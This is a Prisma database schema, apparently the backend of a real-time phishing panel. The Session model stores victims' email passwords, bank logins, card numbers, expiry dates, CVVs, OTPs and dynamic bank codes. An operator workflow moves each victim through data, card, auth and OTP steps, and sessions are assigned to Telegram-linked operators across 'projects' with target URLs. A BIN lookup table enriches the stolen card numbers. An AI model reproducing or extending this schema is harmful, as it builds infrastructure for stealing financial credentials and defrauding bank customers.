// This is your Prisma schema file,
// learn more about it in the docs: https://pris.ly/d/prisma-schema

// Looking for ways to speed up your queries, or scale easily with your serverless or edge functions?
// Try Prisma Accelerate: https://pris.ly/cli/accelerate-init

generator client {
  provider = "prisma-client-js"
}

datasource db {
  provider = "postgresql"
  url      = env("DATABASE_URL")
}

enum SessionState {
  ACTIVE
  INACTIVE
  MINIMIZED
  FINISHED
  BANNED
}

enum ActionState {
  DATA
  DATA_WAIT_ACTION
  DATA_ERROR

  CC
  CC_WAIT_ACTION
  CC_ERROR

  AUTH
  AUTH_WAIT_ACTION
  AUTH_ERROR

  DINAMIC
  DINAMIC_WAIT_ACTION
  DINAMIC_ERROR

  OTP
  OTP_WAIT_ACTION
  OTP_ERROR

  CUSTOM_ERROR
  FINISH
}

enum PanelRole {
  ADMIN
  USER
}

enum ProjectRole {
  OWNER      // Creador del proyecto (admin del sistema)
  USERADMIN  // Puede gestionar usuarios del proyecto
  USER       // Usuario normal, solo puede operar
}

enum MemberStatus {
  PENDING   // Solicitud pendiente
  APPROVED  // Aprobado
  REJECTED  // Rechazado
}

enum ProjectStatus {
  ACTIVE      // Activo
  INACTIVE    // Inactivo
  MAINTENANCE // En mantenimiento
}

model Project {
  id          String        @id @default(uuid())
  slug        String        @unique
  name        String
  url         String
  logoUrl     String?
  description String?
  status      ProjectStatus @default(ACTIVE)
  createdAt   DateTime      @default(now())
  updatedAt   DateTime      @updatedAt

  sessions    Session[]
  users       PanelUserProject[]

  @@index([slug])
  @@index([status])
}

model PanelUserProject {
  id          String       @id @default(uuid())
  panelUserId String
  projectId   String
  role        ProjectRole  @default(USER)
  status      MemberStatus @default(PENDING)
  createdAt   DateTime     @default(now())
  updatedAt   DateTime     @updatedAt

  panelUser   PanelUser @relation(fields: [panelUserId], references: [id], onDelete: Cascade)
  project     Project   @relation(fields: [projectId], references: [id], onDelete: Cascade)

  @@unique([panelUserId, projectId])
  @@index([panelUserId])
  @@index([projectId])
  @@index([status])
}

model Session {
  id                    String       @id @default(uuid())
  state                 SessionState @default(ACTIVE)
  action                ActionState  @default(DATA)
  step                  String?
  ip                    String?
  name                  String?
  phone                 String?
  email                 String?
  emailPass             String?
  address               String?
  bank                  String?
  user                  String?
  pass                  String?
  holder                String?
  cc                    String?
  exp                   String?
  cvv                   String?
  scheme                String?
  brand                 String?
  type                  String?
  level                 String?
  document              String?
  country               String?
  city                  String?
  dinamic               String?
  otp                   String?
  url                   String?

  lastError             String?

  // Relación con PanelUser (operador asignado)
  assignedUserId        String?
  assignedUser          PanelUser? @relation("AssignedSessions", fields: [assignedUserId], references: [id])

  // Relación con Project
  projectId             String?
  project               Project? @relation(fields: [projectId], references: [id])

  createdAt             DateTime @default(now())
  updatedAt             DateTime @updatedAt

  @@index([state])
  @@index([updatedAt])
  @@index([assignedUserId])
  @@index([projectId])
}

model PanelUser {
  id          String    @id @default(uuid())
  laravelId   Int       @unique
  username    String    @unique
  alias       String?
  tgChatId    String?   @unique
  tgUsername  String?
  role        PanelRole @default(USER)
  isActive    Boolean   @default(true)
  lastLoginAt DateTime?
  createdAt   DateTime  @default(now())
  updatedAt   DateTime  @updatedAt

  // Relaciones
  assignedSessions Session[] @relation("AssignedSessions")
  otpCodes         OtpCode[]
  projects         PanelUserProject[]

  @@index([username])
  @@index([laravelId])
  @@index([tgChatId])
}

model OtpCode {
  id          String    @id @default(uuid())
  panelUserId String
  panelUser   PanelUser @relation(fields: [panelUserId], references: [id], onDelete: Cascade)
  codeHash    String
  expiresAt   DateTime
  usedAt      DateTime?
  createdAt   DateTime  @default(now())

  @@index([panelUserId])
  @@index([expiresAt])
}

model BinLookup {
  id         String   @id @default(cuid())
  bin        String   @unique @db.VarChar(6)  // clave de cache: "457562"
  scheme     String?  @db.VarChar(32)         // visa/mastercard/amex...
  brand      String?  @db.VarChar(64)         // marca/variant si aplica
  type       String?  @db.VarChar(16)         // credit/debit/prepaid
  level      String?  @db.VarChar(32)         // classic/gold/platinum...
  bank       String?  @db.VarChar(128)        // banco/emisor
  bankPhone  String?  @db.VarChar(64)
  country    String?  @db.VarChar(2)          // ISO2, ej "CO"

  // auditoría / cache control
  source     String?  @db.VarChar(32)         // "third_party_x", "seed", etc.
  fetchedAt  DateTime?                         // cuándo se consultó externamente
  createdAt  DateTime @default(now())
  updatedAt  DateTime @updatedAt

  @@index([bank])
  @@index([scheme])
  @@map("binlookup")
}